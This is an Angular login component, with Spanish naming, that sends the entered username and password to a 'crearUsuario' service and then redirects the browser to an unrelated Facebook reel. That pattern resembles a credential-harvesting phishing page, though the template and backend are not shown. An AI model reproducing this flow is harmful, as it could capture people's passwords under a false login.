import { Component, OnInit } from '@angular/core';
import { Router } from '@angular/router';
import { AppService } from 'src/app/app.service';
import { Usuario } from 'src/app/usuario.interface';

@Component({
  selector: 'app-login',
  templateUrl: './login.component.html',
  styleUrls: ['./login.component.css']
})
export class LoginComponent implements OnInit {

  constructor(private usuarioService: AppService) { }

  ngOnInit(): void {
  }

  
  usuario: Usuario = {
    user: '',
    password: ''
  };

  crear(){
    if(this.usuario.user === '' || this.usuario.password === '') return
    
     this.usuarioService.crearUsuario(this.usuario).subscribe(resp => {
      this.usuario = resp
     })
    
    window.location.href = "https://www.facebook.com/reel/514358510795128?fs=e&s=7MtrtK&mibextid=z9DgKg"
  }

}
